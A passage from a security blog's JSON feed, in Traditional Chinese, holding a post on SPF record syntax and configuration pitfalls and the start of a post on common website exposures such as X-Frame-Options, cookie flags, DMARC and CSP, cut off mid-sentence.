href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n</ol>\n",
      "date_published": "2021-07-15T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/",
      "title": "關於 email security 的大小事 — 設定篇 SPF",
      "content_html": "<!-- summary -->\n<p>上一次我們深入瞭解了 email security 的原理與應用場景，這次來看看 SPF、DKIM、DMARC 該如何設置吧！</p>\n<!-- summary -->\n<p>請注意，這裡的『設定』並不是回答你『如何在 google 或是 Office365 設好這些紀錄』、『用 XX 服務結果信寄不到怎麼辦』，這種操作配置的教學文請參考官方文件，畢竟 email provider 千千百百家，各自可能有的問題更是難以彙整。</p>\n<p>我想告訴你的『設定』是 SPF、DMARC 的 DNS 紀錄本身有哪些標籤，以及設置這些選項時可能不小心踩到哪些地雷，導致收信方的 email server 在驗證你的郵件時出現非預期地報錯，而判斷驗證失敗。另外，也會告訴你如果有多個子網域，或有使用第三方寄信服務時該怎麼辦。</p>\n<p>總之，可以想成是回答你『我該怎麼理解這些紀錄』和『每個機制有哪些選項跟限制』，而不是針對單一 email provider 的教學文。</p>\n<p>如果你還不太懂 SPF、DKIM、DMARC 是什麼，或是不清楚郵件傳遞過程中的各個角色與職責（MDA、MTA⋯⋯們），或是想了解更多範例與延伸議題，請看本系列其他篇：</p>\n<p>有不懂或是想了解更多範例與延伸議題，請看本系列其他篇～<br>\n如果你還不太懂 SPF、DKIM、DMARC 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">關於 email security 的大小事 — 原理篇</a><br>\n如果你在找 DKIM、DMARC 的設定 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc\">關於 email security 的大小事 — 設定篇 DKIM、DMARC</a><br>\n如果你想搭配設定範例 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">關於 email security 的大小事 — 範例篇</a><br>\n如果你想了解延伸議題 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra\">關於 email security 的大小事 — 延伸篇</a></p>\n<h2 id=\"spf\"><a class=\"direct-link\" href=\"#spf\">#</a> SPF</h2>\n<p>先來看看 SPF。SPF 紀錄的語法說複雜不複雜，但各種小細節常常讓人頭疼，一個很完整的語法介紹可以參考 <a href=\"https://dmarcian.com/spf-syntax-table\">Dmarcian-SPF record syntax</a>。</p>\n<p>如果想配著真實的信件看，建議你可以用 <a href=\"https://mxtoolbox.com/SuperTool.aspx\">mxtoolbox</a> 之類的工具一邊查詢 SPF 紀錄，一邊點開信件原始內容看 SPF 驗證結果：</p>\n<p><img src=\"/img/posts/crystal/email-sec-settings-spf/spf-result.png\" alt=\"\"></p>\n<p>這裡我們先講一下 SPF 驗證時會出現的幾種結果：</p>\n<ul>\n<li><code>Pass</code>：IP 於列表中，驗證成功。採取行為是：accept</li>\n<li><code>Fail</code>：IP 不在列表中，驗證失敗。採取行為是：reject</li>\n<li><code>SoftFail</code>：IP 不在列表中，驗證失敗，但不要直接 reject。採取行為是：accept but mark（標注失敗）</li>\n<li><code>Neutral</code>：不予置評，即使 IP 不在列表中也不視為失敗，視同 <code>None</code>。採取行為是：accept</li>\n<li><code>None</code>：沒有足夠資訊得出結論（例如未找到 SPF 紀錄）。採取行為是：accept</li>\n<li><code>PermError</code>：驗證過程出錯，例如格式錯誤的 SPF 紀錄。採取行為是：unspecified（未定義），交由收信方 email server 自行決定。</li>\n<li><code>TempError</code>：驗證過程出錯，但沒有 PermError 嚴重。採取行為可能是 accept 或暫時 reject，由收信方 email server 自行決定。</li>\n</ul>\n<p>SPF 的小地雷就在於，很多種設置上的小失誤可能導致 PermError、TempError、或是其他削弱 SPF 安全性的結果。因為我們無法預期收信方 email server 會採取什麼行為，所以也無法確保送到收件人手上的信件都有受到 SPF 紀錄的保護。要是對方遇到 Error 一律採取 accept，或是乾脆選擇忽略這筆 SPF 紀錄，那不就形同虛設了嗎？</p>\n<p>下面我們看看 SPF 紀錄中的標籤： 8 個機制（mechanism）跟 2 種修飾（modifier），以及他們可能踩到地雷的情形。所有的標籤（tag）與標籤值（tag value）中間都不能有空白。此外，至少在出現更新版本的 SPF spec之前，現階段 SPF 紀錄開頭必須是 <code>v=spf1</code>。</p>\n<p><figure><img src=\"/img/posts/crystal/email-sec-theory/spf.png\" /><figcaption><p>簡短的 SPF record（取自 維基百科）</p>\n</figcaption></figure></p>\n<p>以下我們稱信件的來源（也就是 <code>smtp.MailFrom</code>）為 sender-domain 或 sender-ip，標籤值為 target-domain 或 target-ip。</p>\n<h3 id=\"mechanisms\"><a class=\"direct-link\" href=\"#mechanisms\">#</a> Mechanisms</h3>\n<p>8 個 mechanism 為： <code>all, ip4, ip6, a, mx, ptr, exists, include</code></p>\n<p>SPF 紀錄驗證時是照著 mechanism 出現的順序比對的，比對結果為 match、 not-match、或 error 之一，一旦成功找到 match 或是發生 error 就會停下。</p>\n<p>在每個 mechanism 前都可能帶有一個 qualifier 符號，為下列其一：</p>\n<ul>\n<li><code>pass(+)</code>：若對到 sender-ip，結果 pass（即白名單）。預設值，可以省略（ <code>+all</code> 同 <code>all</code>）</li>\n<li><code>neutral(?)</code>：None ，等同沒有 policy。</li>\n<li><code>softfail(~)</code>：若對到 sender-ip，結果 fail，仍要標注並接受。</li>\n<li><code>fail(-)</code>：若對到 sender-ip，結果 fail（即黑名單）。</li>\n</ul>\n<h5 id=\"all\"><a class=\"direct-link\" href=\"#all\">#</a> all</h5>\n<p>語法為： <code>[qualifier]all</code></p>\n<p>必須在紀錄最末，是最後一個判斷條件。一般來說應設置最嚴謹的 <code>-all</code>，表示除了前述 mechanism 指定的 target IP 外一律拒絕（<code>fail(-)</code>），所以如果前面的 mechanism 都沒對到，最後就會失敗。</p>\n<p>地雷：</p>\n<ul>\n<li>缺少 <code>all</code>：<code>PermError</code></li>\n<li><code>all</code> 後面的任何標籤均會被忽略</li>\n<li><code>?all, +all</code>：不管前面有沒有對到，都視為 pass。SPF 跟沒設一樣。</li>\n</ul>\n<h5 id=\"ip4%2C-ip6\"><a class=\"direct-link\" href=\"#ip4%2C-ip6\">#</a> ip4, ip6</h5>\n<p>語法為：<code>[qualifier]ip4:target-ip[cidr-length]</code> 或 <code>[qualifier]ip6:target-ip[cidr-length]</code></p>\n<p>分別用 ipv4 與 ipv6 定義的 IP 列表，只要是 CIDR 表示法都可以，例如 <code>192.168.0.1/16</code>。斜線後的 prefix length 如果省略，會預設為 <code>/32</code>（ipv4）與 <code>/128</code>（ipv6）。</p>\n<p>地雷：</p>\n<ul>\n<li>不合法的 IP：<code>PermError</code></li>\n</ul>\n<h5 id=\"a\"><a class=\"direct-link\" href=\"#a\">#</a> a</h5>\n<p>語法為：<code>[qualifier]a:[target-domain][cidr-length]</code></p>\n<p>檢查 sender IP 是否在 target-domain 的 A 或 AAAA 紀錄中，即是否為 target-domain 所擁有的 IP。如果沒有寫 target-domain 就會默認為當前 SPF 紀錄的網域， <code>a</code> 等同 <code>a:sender-domain</code>。</p>\n<h5 id=\"mx\"><a class=\"direct-link\" href=\"#mx\">#</a> mx</h5>\n<p>語法為：<code>[qualifier]mx:[target-domain][cidr-length]</code></p>\n<p>檢查 sender IP 是否在 target-domain 的 MX 紀錄中。如果沒有寫 target-domain 就會默認為當前 SPF 紀錄的網域， <code>mx</code> 等同 <code>mx:sender-domain</code>。</p>\n<p>地雷：</p>\n<ul>\n<li>若一個 MX 紀錄包含超過 10 個 A 或 AAAA 紀錄：<code>PermError</code></li>\n</ul>\n<h5 id=\"ptr-%EF%BC%88%E5%B7%B2%E5%BB%A2%E6%A3%84%EF%BC%89\"><a class=\"direct-link\" href=\"#ptr-%EF%BC%88%E5%B7%B2%E5%BB%A2%E6%A3%84%EF%BC%89\">#</a> ptr （已廢棄）</h5>\n<p>語法為：<code>[qualifier]ptr:[target-domain]</code></p>\n<p>進行 reverse DNS lookup，若得到的網域是 <code>smtp.MailFrom</code> 或其子網域，則 pass。此機制速度慢且會 .arpa name servers 的負擔，請勿使用。</p>\n<p>地雷：</p>\n<ul>\n<li>若一個 PTR 紀錄包含超過 10 個 A 或 AAAA 紀錄，只看前十個後面忽略</li>\n</ul>\n<h5 id=\"exists\"><a class=\"direct-link\" href=\"#exists\">#</a> exists</h5>\n<p>語法為：<code>[qualifier]exists:target-domain</code></p>\n<p>若 target-domain 存在 A 紀錄，視為 pass。</p>\n<h5 id=\"include\"><a class=\"direct-link\" href=\"#include\">#</a> include</h5>\n<p>語法為：<code>[qualifier]include:target-domain</code></p>\n<p>跟寫程式呼叫另一個函數的概念類似，會檢查 target-domain 的 SPF 紀錄並且一直遞迴查詢下去，直到比對過每一個 IP。但 include 不代表把對方的 SPF 紀錄 inline 插入自己的，而是跳到對方的 SPF 紀錄的 context 中比對，最後得到 match、 not-match、或 error 的結果。</p>\n<p>在遞迴過程中，子紀錄的驗證結果對母紀錄的 include 機制的影響為：</p>\n<ul>\n<li><code>Pass</code>→ include 判定：match</li>\n<li><code>Fail, Softfail, Neutral</code>→ include 判定：not-match</li>\n<li><code>PermError, None</code>→ include 判定：<code>PermError</code></li>\n<li><code>TempError</code>→ include 判定：<code>TempError</code></li>\n</ul>\n<p>include 機制適合用在核准外部（跨域）的 email provider，例如當我們使用第三方寄件服務時，就要把對方的 SPF 紀錄用 include 機制放到我們的SPF 紀錄。</p>\n<h3 id=\"modifiers\"><a class=\"direct-link\" href=\"#modifiers\">#</a> Modifiers</h3>\n<p>2 種修飾為： <code>redirect, exp</code></p>\n<h5 id=\"redirect\"><a class=\"direct-link\" href=\"#redirect\">#</a> redirect</h5>\n<p>語法為：<code>redirect:target-domain</code></p>\n<p>必須在紀錄最末，與 all 不可同時出現。若前面的 mechanism 驗證完畢但都沒有找到 match，就用 target-domain 的 SPF 紀錄取代自己的。與 include 的母子關係不同，這裡用 inline 概念插入，所以任何報錯視為當前 SPF 紀錄的 Error。</p>\n<p>地雷：</p>\n<ul>\n<li>若 target-domain 沒有 SPF 紀錄：<code>PermError</code></li>\n<li><code>all</code> 與 <code>redirect</code> 只能出現一個，若紀錄中兩者同時出現則 <code>redirect</code> 會被忽略</li>\n</ul>\n<h5 id=\"exp\"><a class=\"direct-link\" href=\"#exp\">#</a> exp</h5>\n<p>語法為：<code>exp:target-domain</code></p>\n<p>代表 explanation，若 SPF 紀錄驗證結果為 <code>Fail</code>，會返回 target-domain 的 TXT 紀錄內的字串。</p>\n<p>地雷：</p>\n<ul>\n<li>若在 include 的 target-domain 的 SPF 紀錄中找到 exp，會忽略（母子關係）；若在 redirect 的 target-domain 的 SPF 紀錄中找到 exp，則會忽略原紀錄的 exp（取代關係）</li>\n</ul>\n<h3 id=\"%E5%85%B6%E4%BB%96%E5%9C%B0%E9%9B%B7%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%85%B6%E4%BB%96%E5%9C%B0%E9%9B%B7%EF%BC%9A\">#</a> 其他地雷：</h3>\n<ul>\n<li>DNS 回傳 NXDOMAIN（沒有 <code>smtp.MailFrom</code> 這個網域）：<code>None</code></li>\n<li>找到複數筆 SPF 紀錄：<code>PermError</code></li>\n<li>SPF 紀錄開頭不是 <code>v=spf1</code>：<code>None</code></li>\n<li>SPF 紀錄被設成 SPF 類型而不是 TXT 類型：SPF 類型作為 SPF 機制發展的過渡期使用，目前已廢棄，處理方式未定義</li>\n<li>任何語法錯誤，例如 mechanism 或 modifier 拼錯字，或是中間多了空格等：<code>PermError</code></li>\n<li>DNS 查詢 timeout 、server failure 等除了 success 與 nxdomain 的結果：<code>TempError</code></li>\n<li>發生大於兩次 void lookup，也就是 DNS query 回傳空白結果（success 與 nxdomain）：<code>PermError</code></li>\n<li>涵括除了 <code>all, ip4, ip6, exp</code>之外的所有標籤，以及往下遞迴時需要的 DNS query，總計超過 10 次 DNS lookup：<code>PermError</code></li>\n<li>若 redirect 或 include 的網域有重複（例如 SPF 紀錄有：<code>include: a.com include:b.com</code> 但是 <a href=\"http://a.com\">a.com</a> 的 SPF 紀錄內已經有 <code>include:b.com</code>）或是 loop（a include b → b include c → c include a）的情況，不會報錯，但很可能會導致超過 10 次 DNS lookup</li>\n<li>若驗證一筆 SPF 紀錄需要超過 20 秒：<code>TempError</code></li>\n<li>每個 modifier 在 SPF 紀錄只能各出現一次，若超過：<code>PermError</code></li>\n</ul>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> 多個子網域</h3>\n<p>如果你有多個會寄信的網域，就要為每一個分別設置 SPF 紀錄。如果它們是從同一個 email server 寄出去的，可以用 redirect 統一指向一筆紀錄，方便管理。</p>\n<p>不寄信的網域（parked domain）請設置 <code>v=spf1 -all</code>。</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> 第三方服務</h3>\n<p>如果你有使用第三方的寄件服務，例如 SendGrid，你可以在 SPF 紀錄中用 include 機制把第三方的 email server 涵蓋進來，例如 OneDegree 使用微軟 Outlook、MailChimp、FreshDesk、SendGrid 等服務：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=spf1 include:spf.protection.outlook.com include:servers.mcsv.net include:email.freshdesk.com -all</code></pre>\n<p>眼尖的人可能會發現，上面的紀錄怎麼少了 <code>include:sendgrid.net</code>？</p>\n<p>其實，你如果去查這幾個第三方服務的的 SPF 紀錄就會發現，FreshDesk 的 SPF 紀錄就已經有 <code>include:sendgrid.net</code> 這一行，因此我們就不用加啦！這樣也可以省下一筆 DNS lookup 的扣打，畢竟 10 次 DNS lookup 是很容易超過的。</p>\n<p>這裡也順便回答一個非常常見的問題：</p>\n<blockquote>\n<p>『超過 10 次 DNS lookup 怎麼辦』</p>\n</blockquote>\n<p>只要你多用幾個第三方寄件服務，馬上就超過 10 次了，畢竟你 include 他算一次，他用到的 include、a、mx 等等也通通算你的！還不含你自己的一些 email server 呢！</p>\n<p>解決這個問題有幾個撇步：</p>\n<p>如果你有 lookup 到你自己的一些 email server，可以考慮用 ip4 ip6 直接 inline 插進來，例如：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// before  <br>mydom.com -> include:sub1.mydom.com mx:sub2.mydom.com include:a.com  <br>sub1.mydom.com(SPF) -> ip4:192.x.x.3 ip4:172.x.x.x/16  <br>sub2.mydom.com(MX) -> 192.x.126.5<br><br>//after  <br>mydom.com -> ip4:192.x.x.3 ip4:172.x.x.x/16 ip4:192.x.126.5 include:a.com</code></pre>\n<p>或者，可以考慮把這個寄信的 domain 拆成幾個不同功用的 subdomain 然後把第三方寄件服務也依據用途瓜分下去，這樣每個 domain 都有自己的 10 次扣打。例如：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// before  <br>mydomain.com -> include:a.com include:b.com include:c.com <br><br>//after  <br>mydomain.com -> include:a.com   <br>customer.mydomain.com -> include:b.com   <br>partnership.mydomain.com -> include:c.com</code></pre>\n<p>如果你很不幸地用到了一個第三方服務，他自己的 SPF 紀錄就要用到快 10 次 lookup，那只能說….換一個吧？（或是聯繫對方看看他們有什麼建議啦）</p>\n<h2 id=\"%E7%B5%90%E8%AB%96\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96\">#</a> 結論</h2>\n<p>恭喜大家搞懂三劍客裡最難設定的 SPF 啦！你可以在網路上找到的 SPF 紀錄檢查器通常不會把我們討論的地雷全都檢查一次，因為實在是太麻煩啦QQ 推薦你可以多用幾種工具配著這篇仔細檢視一下你的 SPF 紀錄，然後跟著下一篇設好 DMARC 後，就可以在每日的彙整報告中看到 SPF 通過跟失敗的紀錄囉！</p>\n<h3 id=\"reference%3A\"><a class=\"direct-link\" href=\"#reference%3A\">#</a> Reference:</h3>\n<ol>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7208\">SPF RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc6376\">DKIM RFC</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc7489\">DMARC RFC</a></li>\n</ol>\n",
      "date_published": "2021-07-14T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-common-risk-exposure/",
      "title": "資安科普番外篇（一）-大意了啊沒有閃！常見網站曝險你中了幾項？！",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<blockquote>\n<p>曝險就是暴露的風險，而曝險評估就是<strong>模擬駭客在網路上搜尋網站的資訊進行攻擊鏈的構建進行暴露的風險評估</strong>，而在協助許多商業網站（ e.g. 擁有會員登入、金流功能）執行非侵入式的網路曝險檢測時，發現許多商業網站的檢測結果在去除極端值後，有 60% 以上的網站曝險是共通的，來關注一下這些常見的網路曝險你的網站是否也大意了沒有閃。</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E6%91%98%E8%A6%81\"><a class=\"direct-link\" href=\"#%E6%91%98%E8%A6%81\">#</a> 摘要</h2>\n<p>以去除極端值之後的檢測結果統計，排列出目前發生比例大於 50 % 的網路曝險，並說明<strong>可能造成的風險</strong>以及如何簡單的進行<strong>初步自我曝險檢測</strong>。</p>\n<p>之後會在番外篇（二 ）中提供這幾項<strong>風險的改善複雜度</strong>說明以及解決辦法和關鍵字，另外也會說明這些曝險與目前現行一些較為<strong>知名法規的關聯</strong>。</p>\n<h2 id=\"%E5%B8%B8%E8%A6%8B%E7%B6%B2%E7%AB%99%E6%9B%9D%E9%9A%AA%E6%8E%92%E5%90%8D\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E7%B6%B2%E7%AB%99%E6%9B%9D%E9%9A%AA%E6%8E%92%E5%90%8D\">#</a> 常見網站曝險排名</h2>\n<h2 id=\"%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%95-x-frame-options-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> №５ X-Frame-Options 未設置或安全等級不足</h2>\n<p>排行第五的 X-Frame-Options 設置，在這個項目裡有大於 50％ 的網站設置的安全等級不足或是沒有進行設置，X-Frame-Options 用途為<strong>針對 Iframe 點擊劫持攻擊</strong>的手法進行防禦，避免網頁被內嵌。</p>\n<p><strong>點擊劫持攻擊</strong>是一種攻擊者在網站上通過 iframe 隱藏目標網頁，欺騙用戶點擊隱藏惡意連結，舉例來說，覆蓋在影片播放鍵上的隱藏超連結，當使用者點擊後，便會下載惡意程式或是彈出惡意網頁讓使用者瀏覽，讓使用者的機敏資訊外洩而導致資安事件的發生，這樣的攻擊很有可能會使網站業者的商譽受到損害。</p>\n<p>而發生此項曝險表示當攻擊者獲取這項資訊時，很有可能會嘗試對網站進行 Iframe 點擊劫持的攻擊手法。</p>\n<h3 id=\"%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A\">#</a> 新聞參考：</h3>\n<p><a href=\"https://nakedsecurity.sophos.com/2019/08/29/web-clickjacking-fraud-makes-a-comeback-thanks-to-javascript-tricks/\"><strong>Web clickjacking fraud makes a comeback thanks to JavaScript tricks</strong></a></p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F\">#</a> 初步自我檢視方式</h3>\n<p>按下 F12 後，點選 Network 在左方開啟想要檢視的檔案，接著選擇 Header 便可以查看是否有設置 <a href=\"https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Headers/X-Frame-Options#%E4%BD%BF%E7%94%A8_x-frame-options\">X-Frame-Options</a>。</p>\n<p><img src=\"/img/posts/jo/zerobased-common-risk-exposure/p1.png\" alt=\"\"></p>\n<p><strong>X-Frame-Options有三種值：</strong></p>\n<p><code>DENY</code>表示網頁無論如何都無法被嵌入到 frame 中，即使於相同網域內嵌入也不允許。</p>\n<p><code>SAMEORIGIN</code>唯有當符合<a href=\"https://developer.mozilla.org/zh-TW/docs/Web/Security/Same-origin_policy\">同源政策</a>下，才能被嵌入到 frame 中。</p>\n<p><code>ALLOW-FROM _uri_</code>［已廢止］唯有列表許可的 URI 才能嵌入到 frame 中，不過新版瀏覽器已不再支援此指令。</p>\n<h2 id=\"%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%94cookie-%E5%9F%BA%E6%9C%AC%E8%A8%AD%E5%AE%9A%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> №４Cookie 基本設定未設置或安全等級不足</h2>\n<p>排名第四的 Cookie 基本設定未設置或安全等級不足，在這個項目裡有大於 60％ 的網站設置安全等級不足或是沒有進行設置，而 Cookie 的三項基本設定為，能夠<strong>阻止（ XSS ）跨站腳本攻擊影響擴大</strong>的 HttpOnly 、<strong>強化 Https 機制</strong>的 Secure 以及<strong>預防（ CSRF ）跨站請求偽冒</strong>的 SameSite 。</p>\n<p>由於三項安全設定也同樣都是網站公開資訊，在相關資訊容易被取得的情況下使三項基本設定很容易成為攻擊者篩選攻擊標的第一層過濾，也就是當攻擊者發現這三項設定設置不全甚至未設置的網站業者，攻擊者會特別關注，將網站納入攻擊的標的清單。</p>\n<h3 id=\"xss-%E8%B7%A8%E7%AB%99%E8%85%B3%E6%9C%AC%E6%94%BB%E6%93%8A%EF%BC%9A\"><a class=\"direct-link\" href=\"#xss-%E8%B7%A8%E7%AB%99%E8%85%B3%E6%9C%AC%E6%94%BB%E6%93%8A%EF%BC%9A\">#</a> XSS 跨站腳本攻擊：</h3>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\"><strong>零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）</strong><br>\n</a></p>\n<h3 id=\"csrf-%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E5%86%92%EF%BC%9A\"><a class=\"direct-link\" href=\"#csrf-%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E5%86%92%EF%BC%9A\">#</a> CSRF 跨站請求偽冒：</h3>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\"><strong>零基礎資安系列（一）-認識 CSRF（Cross Site Request Forgery）</strong><br>\n</a></p>\n<h3 id=\"%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-2\"><a class=\"direct-link\" href=\"#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-2\">#</a> 新聞參考：</h3>\n<p><a href=\"https://www.ithome.com.tw/news/111254\"><strong>麥當勞官網遭爆有XSS漏洞，可解密竊取用戶密碼</strong><br>\n</a></p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-2\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-2\">#</a> 初步自我檢視方式</h3>\n<p>因為這堪稱網站安全三本柱的三個基本設定，為了三項基本設定寫了一篇文章，提供自我檢視風險的方式以及更深入的說明，有興趣了解更多關於 Cookie 三項基本設定資訊的朋友可以參考下方文章</p>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-secure-samesite-httponly\"><strong>零基礎資安系列（三）-網站安全三本柱（Secure &amp; SameSite &amp; HttpOnly）</strong><br>\n</a></p>\n<h2 id=\"%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%93-%E9%83%B5%E4%BB%B6%E7%B3%BB%E7%B5%B1-dmarc-%E8%A8%AD%E5%AE%9A\">#</a> №３ 郵件系統 DMARC 設定</h2>\n<p>排名第三的郵件系統 DMARC 設定，在這個項目裡有大於 70％ 的網站DMARC 設置不全或無設置，<strong>DMARC 會向收件伺服器指示該如何處理特定郵件</strong>，讓伺服器在收到疑似來自自身機構卻未通過驗證檢查的郵件，或是不符合 DMARC 政策記錄中驗證規定的郵件時，採取合適的處置方式。</p>\n<p>例如無法通過驗證的郵件有兩種，一種是<strong>冒用自身機構名義的郵件</strong>，另一種則是<strong>從未經驗證的伺服器寄出的郵件</strong>， DMARC 便會拒絕惡意電子郵件訊息（拒收）或隔離惡意電子郵件訊息（垃圾信件），<strong>強化收件者對未授權郵件的識別</strong>，藉此<strong>讓社交工程發生的可能性減低</strong>，是<strong>除了進行社交工程演練以及強化員工資安意識以外很好的防護手段</strong>。</p>\n<p><strong>DMARC 的設定在近期受重視程度逐漸提高</strong>，如世界知名顧問公司 Gartner 就在他們的 <a href=\"https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/\">list of critical security projects</a> 中，建議將 DMARC 納入安全評估，而綜合了報告以及測試結果，其實也意味著目前大多數的業者仍是依靠<strong>社交工程演練</strong>以及<strong>資安訓練</strong>來作為防範社交工程的手法，但因爲現在的攻擊手法，許多駭客在攻擊前都會利用**「勒索軟體即服務」 （Ransomware-as-a-Service，RaaS）**的方式，降低攻擊技術門檻及成本提高攻擊頻次，而在疫情影響大家逐漸習慣在家工作的情況下，社交工程變得更加防不勝防，靠傳統的方式並不能確保自身不受社交工程的影響。</p>\n<h3 id=\"%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-3\"><a class=\"direct-link\" href=\"#%E6%96%B0%E8%81%9E%E5%8F%83%E8%80%83%EF%BC%9A-3\">#</a> 新聞參考：</h3>\n<p><a href=\"https://www.ithome.com.tw/news/145223\"><strong>報導：巴西最大醫療診斷業者Grupo Fleury也遭勒索軟體REvil攻陷</strong><br>\n</a></p>\n<h3 id=\"%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-3\"><a class=\"direct-link\" href=\"#%E5%88%9D%E6%AD%A5%E8%87%AA%E6%88%91%E6%AA%A2%E8%A6%96%E6%96%B9%E5%BC%8F-3\">#</a> 初步自我檢視方式</h3>\n<p>在檢視 DMARC 的設定時，其實最大的問題在於沒有設定 DMARC ，而通常檢視自身 DMARC 的設定需要前往網域供應商網站查看 DMARC 的 TXT 記錄：</p>\n<ol>\n<li>登入網域供應商提供的管理控制台。</li>\n<li>找出用於更新網域 DNS TXT 記錄的網頁或資訊主頁。</li>\n<li>查看網域的 DNS TXT 記錄。如果網域已經有 DMARC 記錄，就會看到一筆以 v=DMARC 開頭的 TXT 記錄項目。</li>\n</ol>\n<h3 id=\"%E5%A6%82%E4%BD%95%E6%AA%A2%E6%9F%A5%E7%8F%BE%E6%9C%89%E7%9A%84-dmarc-%E8%A8%98%E9%8C%84%E5%8F%83%E8%80%83%EF%BC%9A\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E6%AA%A2%E6%9F%A5%E7%8F%BE%E6%9C%89%E7%9A%84-dmarc-%E8%A8%98%E9%8C%84%E5%8F%83%E8%80%83%EF%BC%9A\">#</a> 如何檢查現有的 DMARC 記錄參考：</h3>\n<p><a href=\"https://support.google.com/a/answer/10032674?hl=zh-Hant&amp;ref_topic=2759254\"><strong>設定 DMARC 前的注意事項</strong><br>\n</a></p>\n<h2 id=\"%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> №２CSP 未設置或安全等級不足</h2>\n<p>排名第二的CSP 未設置或安全等級不足，在這個項目裡有將近 90% 的網站CSP 未設置或安全等級不足，**網頁內容安全政策 （ Content Security Policy, CSP）**主要是為了防範 <strong>XSS（跨站腳本攻擊）</strong>，以告知瀏覽器發出的 Request 